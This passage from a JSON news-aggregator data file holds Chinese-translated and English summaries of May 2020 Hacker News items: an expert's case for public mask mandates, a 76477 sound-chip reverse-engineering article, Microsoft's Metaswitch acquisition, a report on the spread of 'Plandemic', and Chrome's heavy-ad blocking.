793a\uff0c\u53e3\u7f69\u201c\u5728\u9632\u6b62\u666e\u901a\u516c\u4f17\u611f\u67d3#\u51a0\u72b6\u75c5\u6bd2\u65b9\u9762\u6548\u679c\u4e0d\u4f73\u201d\u3002\u8fd9\u5ffd\u7565\u4e86\u5173\u952e\u7684\u4e00\u70b9\uff1a\u6b63\u5982\u6211\u4eec\u5bf9\u6587\u732e\u7684\u56de\u987e\u6240\u663e\u793a\u7684\u90a3\u6837\uff0c\u5b83\u4eec\u5728\u9632\u6b62\u5b83\u7684\u4f20\u64ad\u65b9\u9762\u975e\u5e38\u6709\u6548\u3002\n\u7b2c\u4e8c\u4e2a\u95ee\u9898\u662f\uff0c\u5927\u591a\u6570\u533b\u5b66\u7814\u7a76\u4eba\u5458\u4e60\u60ef\u4e8e\u5728\u968f\u673a\u5bf9\u7167\u8bd5\u9a8c\u7684\u57fa\u7840\u4e0a\u5224\u65ad\u5e72\u9884\u63aa\u65bd\u3002\u8fd9\u4e9b\u90fd\u662f\u5faa\u8bc1\u533b\u5b66\u7684\u57fa\u7840\u3002\u7136\u800c\uff0c\u5728\u5927\u6d41\u884c\u671f\u95f4\u6d4b\u8bd5\u6234\u53e3\u7f69\u3001\u6d17\u624b\u6216\u793e\u4ea4\u8ddd\u79bb\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u4e5f\u662f\u4e0d\u9053\u5fb7\u7684\u3002\n\u50cfTrisha Greenhalgh\u8fd9\u6837\u7684\u4e13\u5bb6\uff0c\u7545\u9500\u6559\u79d1\u4e66\u201c\u5982\u4f55\u9605\u8bfb\u4e00\u7bc7\u8bba\u6587\uff1a\u5faa\u8bc1\u533b\u7597\u57fa\u7840\u201d\u7684\u4f5c\u8005\uff0c\u73b0\u5728\u95ee\u9053\uff0c\u201c\u51a0\u72b6\u75c5\u6bd2\u662f\u5faa\u8bc1\u533b\u5b66\u7684\u6b7b\u5bf9\u5934\u5417\uff1f\u201d\u5979\u548c\u5176\u4ed6\u4eba\u5efa\u8bae\uff0c\u5f53\u4e00\u4e2a\u7b80\u5355\u7684\u5b9e\u9a8c\u627e\u5230\u652f\u6301\u5e72\u9884\u7684\u8bc1\u636e\uff0c\u5e76\u4e14\u5e72\u9884\u7684\u8d1f\u9762\u5f71\u54cd\u6709\u9650\u65f6\uff0c\u653f\u7b56\u5236\u5b9a\u8005\u5e94\u8be5\u5728\u968f\u673a\u8bd5\u9a8c\u5b8c\u6210\u4e4b\u524d\u91c7\u53d6\u884c\u52a8\u3002\n\u7b2c\u4e09\u4e2a\u95ee\u9898\u662f\u4e16\u754c\u5404\u5730\u7684\u533b\u7528\u53e3\u7f69\u77ed\u7f3a\u3002\u8bb8\u591a\u653f\u7b56\u5236\u5b9a\u8005\u62c5\u5fc3\uff0c\u5411\u516c\u4f17\u63a8\u8350\u9762\u7f69\u4f1a\u5bfc\u81f4\u4eba\u4eec\u56e4\u79ef\u533b\u7528\u53e3\u7f69\u3002\u8fd9\u5bfc\u81f4\u4e86\u4f3c\u4e4e\u76f8\u4e92\u77db\u76fe\u7684\u6307\u5bfc\u65b9\u9488\uff0c\u75be\u63a7\u4e2d\u5fc3\u8868\u793a\uff0c\u516c\u4f17\u6ca1\u6709\u7406\u7531\u6234\u53e3\u7f69\uff0c\u4f46\u9700\u8981\u4e3a\u533b\u52a1\u4eba\u5458\u4fdd\u7559\u53e3\u7f69\u3002\u75be\u63a7\u4e2d\u5fc3\u73b0\u5728\u5df2\u7ecf\u6f84\u6e05\u4e86\u7acb\u573a\uff0c\u5e76\u5efa\u8bae\u516c\u4f17\u4f7f\u7528\u81ea\u5236\u53e3\u7f69\uff0c\u540c\u65f6\u4e3a\u533b\u7597\u4e13\u4e1a\u4eba\u5458\u4fdd\u7559\u8f83\u9ad8\u7b49\u7ea7\u7684\u53e3\u7f69\u3002\n\u6709\u5927\u91cf\u7814\u7a76\u8868\u660e\uff0c\u5982\u679c80%\u7684\u4eba\u5728\u516c\u5171\u573a\u5408\u6234\u4e0a\u53e3\u7f69\uff0c\u90a3\u4e48\u51a0\u72b6\u75c5\u6bd2\u7684\u4f20\u64ad\u5c31\u53ef\u4ee5\u88ab\u963b\u6b62\u3002\u5728\u53d1\u73b0\u51a0\u72b6\u75c5\u6bd2\u75ab\u82d7\u6216\u6cbb\u6108\u65b9\u6cd5\u4e4b\u524d\uff0c\u5e03\u9762\u53e3\u7f69\u53ef\u80fd\u662f\u6211\u4eec\u76ee\u524d\u6297\u51fb\u8fd9\u79cd\u6d41\u884c\u75c5\u7684\u6700\u91cd\u8981\u5de5\u5177\u3002\n\u8003\u8651\u5230\u6240\u6709\u7684\u5b9e\u9a8c\u5ba4\u548c\u6d41\u884c\u75c5\u5b66\u8bc1\u636e\uff0c\u6234\u53e3\u7f69\u7684\u6210\u672c\u4f4e-\u4e0d\u9700\u8981\u5de5\u5177\u5c31\u53ef\u4ee5\u5728\u5bb6\u91cc\u5236\u4f5c-\u4ee5\u53ca\u5927\u89c4\u6a21\u4f7f\u7528\u6709\u53ef\u80fd\u51cf\u7f13\u51a0\u72b6\u75c5\u6bd2\u7684\u4f20\u64ad\uff0c\u653f\u7b56\u5236\u5b9a\u8005\u5e94\u8be5\u786e\u4fdd\u6bcf\u4e2a\u4eba\u5728\u516c\u5171\u573a\u5408\u90fd\u6234\u4e0a\u53e3\u7f69\u3002\n[\u60a8\u9700\u8981\u4e86\u89e3\u51a0\u72b6\u75c5\u6bd2\u5927\u6d41\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u4f9b\u5e2e\u52a9\u3002\u9605\u8bfb\u5bf9\u8bdd\u7684\u65f6\u4e8b\u901a\u8baf\u3002]", "note_en": "I\u2019m a  data scientist at the University of San Francisco and teach courses online in machine learning for  fast.ai. In late March, I decided to use public mask-wearing as a case study to show my students how to combine and analyze diverse types of data and evidence.\n Much to my surprise, I discovered that the evidence for wearing masks in public was very strong. It appeared that universal mask-wearing could be one of the most important tools in tackling the spread of COVID-19. Yet the people around me weren\u2019t wearing masks and health organizations in the U.S. weren\u2019t recommending their use.\n I, along with 18 other experts from a variety of disciplines, conducted a review of the research on public mask-wearing as a tool to slow the spread SARS-CoV-2. We published a preprint of  our paper on April 12 and it is now awaiting peer review at the  Proceedings of the National Academy of Sciences.\n  On May 14, I and 100 of the world\u2019s top academics released an  open letter to all U.S. governors asking that \u201cofficials  require cloth masks to be worn in all public places, such as stores, transportation systems, and public buildings.\u201d\n Currently, the U.S. Centers for Disease Control and Prevention recommends that everyone wears a mask \u2013 as do the governments covering 90% of the world\u2019s population \u2013 but, so far, only 12 states in the U.S. require it. In the majority of the remaining states, the CDC recommendation has not been enough: Most people  do not currently wear masks. However, things are changing fast. Every week more and more jurisdictions require mask use in public. As I write this, there are now  94 countries that have made this move.\n So what is this evidence that has led myself and so many scientists to believe so strongly in masks?\n   The research that first convinced me was a  laser light-scattering experiment. Researchers from the  National Institutes of Health used lasers to illuminate and count how many droplets of saliva were flung into the air by a person talking with and without a face mask. The paper was only recently published officially, but I saw a  YouTube video showing the experiment in early March. The results are shockingly obvious in the video. When the researcher used a simple cloth face cover, nearly all the droplets were blocked.\n This evidence is only relevant if COVID-19 is transmitted by droplets from a person\u2019s mouth.  It is. There are many documented super-spreading cases connected with activities \u2013 like  singing in enclosed spaces \u2013 that create a  lot of droplets.\n The light-scattering experiment cannot see \u201cmicro-droplets\u201d that are smaller than 5 microns and could contain some viral particles. But experts don\u2019t think that these are  responsible for much COVID-19 transmission.\n While just how much of a role these small particles play in transmission remains to be seen, recent research suggests that cloth masks are also effective at reducing the spread of these smaller particles. In a paper that has not yet been peer-reviewed, researchers found that micro-droplets fell out of the air within  1.5 meters of the person who was wearing a mask, versus 5 meters for those not wearing masks. When combined with social distancing, this suggests that masks can effectively reduce transmission via micro-droplets.\n Another recent study showed that unfitted surgical masks were  100% effective in blocking seasonal coronavirus in droplets ejected during breathing.\n If only people with symptoms infected others, then only people with symptoms would need to wear masks. But experts have shown that people without symptoms  pose a risk of infecting others. In fact,  four  recent  studies  show that nearly half of patients are infected by people who do not themselves have symptoms.\n This evidence seems, to me, clear and simple: COVID-19 is spread by droplets. We can see directly that a piece of cloth blocks those droplets and the virus those droplets contain. People without symptoms who don\u2019t even know they are sick are responsible for around half of the transmission of the virus.\n    After going through all of this strong evidence in late March and early April, I wondered why mask-wearing was controversial amongst health organizations in the Western world. The U.S. and European CDCs did not recommend masks, and neither did nearly any western government except for Slovakia and Czechia, which both required masks in late March.\n  The first was that most researchers were looking at the wrong question \u2013 how well a mask protects the wearer from infection and not how well a mask prevents an infected person from spreading the virus. Masks function very differently as personal protective equipment (PPE) versus source control.\n Masks are very good at blocking larger droplets and  not nearly as good at blocking tiny particles. When a person expels droplets into the air, they  quickly evaporate and shrink to become tiny airborne particles called droplet nuclei. These are  extremely hard to remove from the air. However, in the moist atmosphere between a person\u2019s mouth and their mask, it takes nearly  a hundred times as long for a droplet to evaporate and shrink into a droplet nuclei.\n This means that nearly any kind of simple cloth mask is great for source control. The mask creates humidity, this humidity prevents virus-containing droplets from turning into droplet nuclei, and this allows the fabric of the mask to block the droplets.\n Unfortunately, nearly all of the research that was available at the start of this pandemic focused on mask efficacy as PPE. This measure is very important for protecting health care workers, but does not capture their value as source control. On Feb. 29, the U.S.  surgeon general tweeted that masks \u201care NOT effective in preventing general public from catching #Coronavirus.\u201d This missed the key point: They are extremely effective at preventing its spread, as our review of the literature showed.\n The second problem was that most medical researchers are used to judging interventions on the basis of  randomized controlled trials. These are the foundation of evidence based medicine. However, it is impossible and unethical to test mask-wearing, hand-washing or social distancing during a pandemic.\n Experts like Trisha Greenhalgh, the author of the best-selling textbook \u201cHow to Read a Paper: The Basics of Evidence Based Healthcare,\u201d are  now asking, \u201cIs Covid-19 evidence-based medicine\u2019s nemesis?\u201d She and others  are suggesting that when a simple experiment finds evidence to support an intervention and that intervention has a limited downside, policymakers should act before a randomized trial is done.\n The third problem is that there is a shortage of medical masks around the world. Many policymakers were concerned that recommending face coverings for the public would lead to people hoarding medical masks. This led to seemingly contradictory guidance where the CDC said there was no reason for the public to wear masks but that masks needed to be saved for medical workers. The CDC has now clarified its stance and  recommends the public use of homemade masks while saving higher-grade masks for medical professionals.\n   There are  numerous  studies that suggest if 80% of people wear a mask in public, then COVID-19 transmission could be halted. Until a vaccine or a cure for COVID-19 is discovered, cloth face masks might be the most important tool we currently have to fight the pandemic.\n Given all of the laboratory and epidemiological evidence, the low cost of wearing masks \u2013 which can be made at home with no tools \u2013 and the potential to slow COVID-19 transmission with widescale use, policymakers should ensure that everyone wears a mask in public.\n [ You need to understand the coronavirus pandemic, and we can help.  Read The Conversation\u2019s newsletter.]", "posttime": "2020-05-15 01:37:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5dde\u957f,urging,\u53e3\u7f69", "title": "\u6211\u662f\u6566\u4fc3\u5dde\u957f\u4eec\u8981\u6c42\u516c\u4f17\u6234\u53e3\u7f69\u7684100\u540d\u4e13\u5bb6\u4e4b\u4e00", "title_en": "I'm one of 100 experts urging governors to require public mask-wearing", "transed": 1, "url": "https://theconversation.com/masks-help-stop-the-spread-of-coronavirus-the-science-is-simple-and-im-one-of-100-experts-urging-governors-to-require-public-mask-wearing-138507", "via": "", "real_tags": ["\u5dde\u957f", "urging", "\u53e3\u7f69"]}, {"category": "", "categoryclass": "", "imagename": "f714f4a9c5f4f6f8b26864e2b8180931.jpg", "infoid": 1002116, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd8\u8bb0\u5f97\u53e4\u8001\u7684\u89c6\u9891\u6e38\u620f\u201c\u592a\u7a7a\u5165\u4fb5\u8005\u201d\u5417\uff1f\u5b83\u7684\u4e00\u4e9b\u97f3\u6548\u662f\u7531\u4e00\u79cd\u540d\u4e3a76477\u590d\u6742\u58f0\u97f3\u751f\u6210\u82af\u7247\u7684\u82af\u7247\u63d0\u4f9b\u7684\u3002\u867d\u7136\u8fd9\u6b3e1978\u5e74\u82af\u7247\u4ea7\u751f\u7684\u97f3\u6548\u4eca\u5929\u770b\u8d77\u6765\u5f88\u539f\u59cb\uff0c\u4f46\u5b83\u88ab\u7528\u4e8e\u8bb8\u591a\u89c6\u9891\u6e38\u620f\uff0c\u5f39\u7403\u6e38\u620f\u3002\u4f46\u662f\u8fd9\u4e2a\u82af\u7247\u91cc\u6709\u4ec0\u4e48\uff1f\u5b83\u662f\u5982\u4f55\u5185\u90e8\u5de5\u4f5c\u7684\uff1f\u901a\u8fc7\u6839\u636e\u82af\u7247\u7684\u7167\u7247\u5bf9\u82af\u7247\u8fdb\u884c\u9006\u5411\u5de5\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u7b54\u6848\u3002(\u8096\u6069\u00b7\u91cc\u5fb7\u5c14\u63d0\u4f9b\u7684\u7167\u7247)\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u5c06\u89e3\u91ca\u8fd9\u4e2a\u82af\u7247\u7684\u6a21\u62df\u7535\u8def\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u5e76\u5c55\u793a\u7845\u6676\u7247\u4e0a\u7684\u6570\u767e\u4e2a\u6676\u4f53\u7ba1\u662f\u5982\u4f55\u5f62\u6210\u8fd9\u4e2a\u590d\u6742\u82af\u7247\u7684\u7535\u8def\u7684\u3002", "note_en": "Remember the old video game Space Invaders?Some of its sound effects were provided by a chip called the  76477 Complex Sound Generation chip.While the  sound effects  1 produced by this 1978 chip seem primitive today, it was used in many  video games,  pinball  games.But what&#39;s inside this chip and how does it work internally?By reverse-engineering the chip from  die photos, we can find out. (Photos courtesy of  Sean Riddle.)In this article, I explain how the analog circuits of this chip works and show how the hundreds of transistors on the silicon die form the circuits of this complex chip.", "posttime": "2020-05-15 01:09:22", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u592a\u7a7a,\u9006\u5411\u5de5\u7a0b,\u82af\u7247,\u7167\u7247,invaders", "title": "\u4ece\u6a21\u5177\u7167\u7247\u9006\u5411\u5de5\u7a0b76477\u4e2a\u201c\u592a\u7a7a\u5165\u4fb5\u8005\u201d\u58f0\u97f3\u82af\u7247(2017\u5e74)", "title_en": "Reverse engineering the 76477 \u201cSpace Invaders\u201d sound chip from die photos (2017)", "transed": 1, "url": "http://www.righto.com/2017/04/reverse-engineering-76477-space.html?m=1", "via": "", "real_tags": ["\u592a\u7a7a", "\u9006\u5411\u5de5\u7a0b", "\u82af\u7247", "\u7167\u7247", "invaders"]}, {"category": "", "categoryclass": "", "imagename": "1e87b101de7983dabe12b6d639f9d55f.jpg", "infoid": 1002115, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4e0d\u5230\u4e00\u4e2a\u6708\u524d\uff0c\u5fae\u8f6f\u521a\u521a\u5b8c\u6210\u4e86\u5bf9\u53e6\u4e00\u5bb6\u4e13\u6ce8\u4e8e\u7535\u4fe1\u5e02\u573a\u7684\u516c\u53f8Affirmed Networks\u7684\u6536\u8d2d\u3002\n\u5fae\u8f6f\u5468\u56db\u8868\u793a\uff0c\u5df2\u540c\u610f\u6536\u8d2dMetaswitch Networks\uff0c\u8fd9\u662f\u4e00\u5bb6\u62e5\u6709\u8f6f\u4ef6\u7684\u516c\u53f8\uff0c\u7535\u4fe1\u516c\u53f8\u53ef\u4ee5\u4f7f\u7528\u8be5\u8f6f\u4ef6\u5411\u5ba2\u6237\u63d0\u4f9b\u8bed\u97f3\u548c\u6570\u636e\u670d\u52a1\u3002\u4ea4\u6613\u6761\u6b3e\u5e76\u672a\u62ab\u9732\u3002\n\u6b64\u4e3e\u8868\u660e\uff0c\u5fae\u8f6f\u6b63\u52aa\u529b\u901a\u8fc7\u65e0\u673a\u4ea4\u6613\u7784\u51c6\u5355\u4e00\u884c\u4e1a\uff0c\u800c\u4e0d\u662f\u5728\u5185\u90e8\u5efa\u7acb\u4e13\u4e1a\u77e5\u8bc6\u548c\u6280\u672f\u3002\u8fd9\u4e9b\u52aa\u529b\u53ef\u80fd\u4f1a\u5e2e\u52a9\u5fae\u8f6f\u8fdb\u4e00\u6b65\u91c7\u7528\u5176Azure\u516c\u5171\u4e91\uff0c\u8fd9\u5c06\u6311\u6218\u5e02\u573a\u9886\u5148\u8005\u4e9a\u9a6c\u900a\u7f51\u7edc\u670d\u52a1(Amazon Web Services)\u3002\n\u5fae\u8f6f\u516c\u53f8\u526f\u603b\u88c1\u4f18\u7d20\u798f\u00b7\u54c8\u5229\u8fea(Yousef Khalidi)\u5728\u4e00\u7bc7\u535a\u5ba2\u6587\u7ae0\u4e2d\u5199\u9053\uff1a\u4e91\u548c\u901a\u4fe1\u7f51\u7edc\u7684\u878d\u5408\u4e3a\u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u72ec\u7279\u7684\u673a\u4f1a\uff0c\u901a\u8fc7\u5bf9Azure\u7684\u6301\u7eed\u6295\u8d44\u4e3a\u5168\u7403\u8fd0\u8425\u5546\u63d0\u4f9b\u670d\u52a1\uff0c\u901a\u8fc7\u8fd0\u884c\u865a\u62df\u5316\u901a\u4fe1\u529f\u80fd\u3001\u5e94\u7528\u7a0b\u5e8f\u548c\u7f51\u7edc\u6240\u9700\u7684\u4e13\u4e1a\u8f6f\u4ef6\uff0c\u4e3a\u6211\u4eec\u7684\u8d85\u5927\u89c4\u6a21\u4e91\u57fa\u7840\u8bbe\u65bd\u589e\u6dfb\u66f4\u591a\u6df1\u5ea6\u3002\nMetaswitch\u6709\u4e00\u6b3e5G\u4ea7\u54c1\uff0c\u7528\u4e8e\u5904\u7406\u53ef\u4ee5\u5728\u516c\u5171\u4e91\u57fa\u7840\u8bbe\u65bd\u4e0a\u8fd0\u884c\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u5ba2\u6237\u53ef\u4ee5\u4f9d\u8d56\u8be5\u516c\u53f8\u7684\u8f6f\u4ef6\u5efa\u7acb\u5728\u4e91\u57fa\u7840\u8bbe\u65bd\u4e4b\u4e0a\uff0c\u800c\u4e0d\u662f\u5728\u81ea\u5df1\u7684\u6570\u636e\u4e2d\u5fc3\u589e\u52a0\u5bb9\u91cf\uff0c\u4ee5\u652f\u6301\u66f4\u9ad8\u901f\u5ea6\u7684\u989d\u5916\u7f51\u7edc\u4f7f\u7528\u3002\n\u5fae\u8f6f\u5728\u5b8c\u6210\u5bf9\u4ee5\u79fb\u52a8\u8fd0\u8425\u5546\u4e3a\u76ee\u6807\u7684\u521d\u521b\u4f01\u4e1aAffirmed Networks\u7684\u6536\u8d2d\u4e09\u5468\u540e\u5ba3\u5e03\u4e86\u8fd9\u7b14\u4ea4\u6613\u3002\u53bb\u5e74\uff0c\u5fae\u8f6f\u81ea\u5df1\u5ba3\u5e03\u4e86\u4e0e\u7f8e\u56fd\u7535\u8bdd\u7535\u62a5\u516c\u53f8(AT&amp\uff1bT\uff1b)\u7684\u4e00\u9879\u591a\u5e74\u4e91\u534f\u8bae\u3002\nMetaswitch\u7f51\u7ad9\u4e0a\u5217\u51fa\u7684\u5ba2\u6237\u5305\u62ec\u82f1\u56fd\u7535\u4fe1(British Telecom)\u3001Sprint(\u73b0\u5728\u5f52T-Mobile\u6240\u6709)\u3001\u745e\u58eb\u7535\u4fe1(Swisscom)\u3001\u6fb3\u6d32\u7535\u4fe1(Telstra)\u548c\u6c83\u8fbe\u4e30(Vodafone)\u3002\n\u6839\u636eLinkedIn\u7684\u6570\u636e\uff0cMetaswitch\u62e5\u6709\u8fd1700\u540d\u5458\u5de5\u3002\u8be5\u516c\u53f8\u6210\u7acb\u4e8e1981\u5e74\uff0c\u603b\u90e8\u8bbe\u5728\u4f26\u6566\u548c\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684\u6d1b\u65af\u963f\u5c14\u6258\u65af\u3002\u6295\u8d44\u8005\u5305\u62ec\u7ea2\u6749\u8d44\u672c(Sequoia Capital)\u3002", "note_en": "The announcement comes less than a month after Microsoft closed the acquisition of another company focused on the telecommunications market, Affirmed Networks.\n Microsoft said Thursday it has agreed to acquire Metaswitch Networks, a company with software that telecommunications companies can use to deliver voice and data services to their customers. Terms of the deal weren&#39;t disclosed.\n The move shows Microsoft&#39;s efforts to target a single industry through inorganic deals rather than building expertise and technology in house. These efforts could help Microsoft gain further adoption of its Azure public cloud, which challenges market leader  Amazon Web Services.\n  &#34;The convergence of cloud and communication networks presents a unique opportunity for Microsoft to serve operators globally via continued investment in Azure, adding additional depth to our hyperscale cloud infrastructure with the specialized software required to run virtualized communication functions, applications and networks,&#34; Yousef Khalidi, a Microsoft corporate vice president, wrote in a  blog post.\n Metaswitch has a 5G product for handling network traffic that can run on public cloud infrastructure. Customers could rely on the company&#39;s software atop cloud infrastructure rather than adding capacity in their own data centers to support additional network use at higher speeds.\n Microsoft announced the deal three weeks after the close of its acquisition of\u00a0 Affirmed Networks, a start-up targeting mobile carriers. Last year Microsoft itself announced a  multi-year cloud deal with  AT&amp;T.\n Customers listed on the Metaswitch website include British Telecom, Sprint (which is now owned by  T-Mobile), Swisscom, Telstra and  Vodafone.\n Metaswitch has nearly 700 employees, according to LinkedIn. The company was founded in 1981 and has headquarters in London and Los Altos, California. Investors include\u00a0 Sequoia Capital.", "posttime": "2020-05-15 01:08:51", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5fae\u8f6f,microsoft,\u7535\u4fe1,acquires", "title": "\u5fae\u8f6f\u5728\u7535\u4fe1\u63a8\u5e7f\u4e2d\u6536\u8d2dMetaswitch", "title_en": "Microsoft acquires Metaswitch in telecom push", "transed": 1, "url": "https://www.cnbc.com/2020/05/14/microsoft-acquires-metaswitch-in-telecom-push.html", "via": "", "real_tags": ["\u5fae\u8f6f", "microsoft", "\u7535\u4fe1", "acquires"]}, {"category": "", "categoryclass": "", "imagename": "39af4835765b85b493b80ab52e5bcf34.jpeg", "infoid": 1002114, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Zach Vorhies\u5411\u53f3\u7ffc\u7ec4\u7ec7Project Veritas\u6cc4\u9732\u4e86\u6587\u4ef6\uff0c\u7136\u540e\u6210\u4e3aQAnon\u575a\u5b9a\u7684\u53cdVaxxer\u548c\u63a8\u52a8\u8005\u3002\u57284\u6708\u4efd\u7684\u4e00\u6bb5\u89c6\u9891\u4e2d\uff0c\u4ed6\u9610\u8ff0\u4e86\u5ba3\u4f20\u201cPlandemic\u201d\u7684\u8ba1\u5212\u3002", "note_en": "Zach Vorhies leaked documents to the right-wing group Project Veritas, then became a committed anti-vaxxer and promoter of QAnon. In an April video, he laid out his plan to promote 'Plandemic.'", "posttime": "2020-05-15 01:08:32", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8c37\u6b4c,google,\u6b4c\u4eba,turned,vaxxer", "title": "\u524d\u8c37\u6b4c\u4eba\u6210\u4e3a\u4e3e\u62a5\u4eba\uff0cQAnon Fan\u8ba9\u201cPlandemic\u201d\u8d70\u7ea2", "title_en": "Ex-Googler Turned Whistleblower and QAnon Fan Made 'Plandemic' Go Viral", "transed": 1, "url": "https://www.vice.com/en_us/article/k7qqyn/an-ex-google-employee-turned-whistleblower-and-qanon-fan-made-plandemic-go-viral", "via": "", "real_tags": ["\u8c37\u6b4c", "google", "\u6b4c\u4eba", "turned", "vaxxer"]}, {"category": "", "categoryclass": "", "imagename": "7f2ded749dd4efa38b0ce70a9c5ea7a0.png", "infoid": 1002113, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8c37\u6b4c\u4eca\u5929\u5ba3\u5e03\uff0cChrome\u5c06\u5f00\u59cb\u5c4f\u853d\u8d44\u6e90\u5bc6\u96c6\u578b\u5e7f\u544a\u3002\u4f8b\u5982\u6316\u6398\u52a0\u5bc6\u8d27\u5e01\u7684\u5e7f\u544a\u3001\u7f16\u7a0b\u4e0d\u4f73\u7684\u5e7f\u544a\u6216\u672a\u9488\u5bf9\u7f51\u7edc\u4f7f\u7528\u8fdb\u884c\u4f18\u5316\u7684\u5e7f\u544a\u3002Chrome\u5c06\u5c4f\u853d\u8fd9\u4e9b\u5e7f\u544a\uff0c\u56e0\u4e3a\u5b83\u4eec\u201c\u8017\u5c3d\u4e86\u7535\u6c60\u5bff\u547d\uff0c\u4f7f\u672c\u5df2\u7d27\u5f20\u7684\u7f51\u7edc\u9971\u548c\uff0c\u800c\u4e14\u8fd8\u4f1a\u82b1\u94b1\u3002\u201d\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u9608\u503c\u53ef\u4ee5\u963b\u6b62\u5e7f\u544a\uff1a4MB\u7f51\u7edc\u6570\u636e\u3001\u4efb\u610f30\u79d2\u5468\u671f\u518515\u79d2\u7684CPU\u4f7f\u7528\u7387\u621660\u79d2\u7684\u603bCPU\u4f7f\u7528\u7387\u3002\u8c37\u6b4c\u5c06\u5728\u201c\u63a5\u4e0b\u6765\u7684\u51e0\u4e2a\u6708\u5185\u201d\u8bd5\u9a8c\u8fd9\u4e00\u53d8\u5316\uff0c\u5e76\u5c06\u201c\u57288\u6708\u5e95\u201d\u5728Chrome\u7a33\u5b9a\u7248\u4e0a\u63a8\u51fa\u5b83\u3002\n\u6ca1\u6709\u591a\u5c11\u4eba\u610f\u8bc6\u5230\u4e16\u754c\u4e0a\u6700\u53d7\u6b22\u8fce\u7684\u6d4f\u89c8\u5668\u6709\u5185\u7f6e\u7684\u5e7f\u544a\u62e6\u622a\u7a0b\u5e8f\u3002\u4e24\u5e74\u524d\uff0c\u8c37\u6b4c\u52a0\u5165\u4e86\u66f4\u597d\u5e7f\u544a\u8054\u76df(Coalition For Better Adds)\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e13\u95e8\u4e3a\u884c\u4e1a\u5982\u4f55\u6539\u5584\u6d88\u8d39\u8005\u5e7f\u544a\u5236\u5b9a\u6807\u51c6\u7684\u7ec4\u7ec7\u3002Chrome\u5c4f\u853d\u4e86\u8054\u76df\u5b9a\u4e49\u7684\u663e\u793a\u4e0d\u5408\u89c4\u5e7f\u544a\u7684\u7f51\u7ad9\u4e0a\u7684\u6240\u6709\u5e7f\u544a(\u5305\u62ec\u8c37\u6b4c\u62e5\u6709\u6216\u63d0\u4f9b\u7684\u5e7f\u544a)\u3002\u9664\u4e86\u5e7f\u544a\uff0c\u8c37\u6b4c\u8fd8\u4f7f\u7528Chrome\u7684\u5e7f\u544a\u62e6\u622a\u7a0b\u5e8f\u6765\u89e3\u51b3\u201c\u6ee5\u7528\u4f53\u9a8c\u201d\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u8be5\u5de5\u5177\u66f4\u591a\u7684\u662f\u7528\u6765\u60e9\u7f5a\u4e0d\u826f\u7f51\u7ad9\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u7684\u5e7f\u544a\u62e6\u622a\u7a0b\u5e8f\u3002\n\u56e0\u4e3a\u5e7f\u544a\u62e6\u622a\u5668\u635f\u5bb3\u4e86\u521b\u9020\u514d\u8d39\u5185\u5bb9\u7684\u51fa\u7248\u5546(\u5982VentureBeat)\uff0c\u5c4f\u853d\u6240\u6709\u5e7f\u544a\u4e0d\u4ec5\u4f1a\u524a\u5f31\u7f51\u7edc\u4e3a\u6570\u4e0d\u591a\u7684\u76c8\u5229\u5de5\u5177\u4e4b\u4e00\uff0c\u800c\u4e14\u8fd8\u4f1a\u524a\u5f31Alphabet\u7684\u4e3b\u8981\u6536\u5165\u6765\u6e90\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6539\u5584\u7f51\u7edc\u7528\u6237\u4f53\u9a8c\u7b26\u5408\u8c37\u6b4c\u7684\u65e2\u5f97\u5229\u76ca\u3002\u56e0\u6b64\uff0c\u8c37\u6b4c\u7684\u65b9\u6cd5\u662f\u4ece\u5c0f\u89c4\u6a21\u505a\u8d77\uff0c\u6162\u6162\u5347\u7ea7--\u9010\u6e10\u6539\u53d8\u4f01\u4e1a\u4e3b\u3001\u8425\u9500\u8005\u548c\u5f00\u53d1\u8005\u5efa\u7acb\u7f51\u7ad9\u7684\u65b9\u5f0f\u3002\u8003\u8651\u5230\u5b83\u7684\u8986\u76d6\u8303\u56f4\uff0c\u5305\u62ec\u8d85\u8fc710\u4ebfChrome\u7528\u6237\u548c\u8d85\u8fc725\u4ebf\u53f0\u6bcf\u6708\u6d3b\u8dc3\u7684Android\u8bbe\u5907\uff0c\u66f4\u4e0d\u7528\u8bf4\u8c37\u6b4c\u641c\u7d22\u548c\u8c37\u6b4c\u5e7f\u544a\u4e86\uff0c\u4efb\u4f55\u62e5\u6709\u7f51\u7ad9\u7684\u4eba\u90fd\u9700\u8981\u8ddf\u8e2a\u8c37\u6b4c\u4f18\u5148\u8003\u8651\u7684\u4e8b\u60c5\u3002\n\u8c37\u6b4c\u8868\u793a\uff0c\u201c\u4e0d\u5230\u767e\u5206\u4e4b\u4e00\u7684\u5e7f\u544a\u201d\u6d88\u8017\u4e86\u4e0d\u6210\u6bd4\u4f8b\u7684\u8bbe\u5907\u8d44\u6e90\uff0c\u5305\u62ec\u7535\u6c60\u548c\u7f51\u7edc\u6570\u636e\u3002\u8be5\u516c\u53f8\u6d4b\u91cf\u4e86Chrome\u770b\u5230\u7684\u5e7f\u544a\uff0c\u5e76\u9501\u5b9a\u4e86\u6700\u6076\u52a3\u7684\u5e7f\u544a\uff0c\u5373\u90a3\u4e9b\u201c\u4f7f\u7528\u7684CPU\u6216\u7f51\u7edc\u5e26\u5bbd\u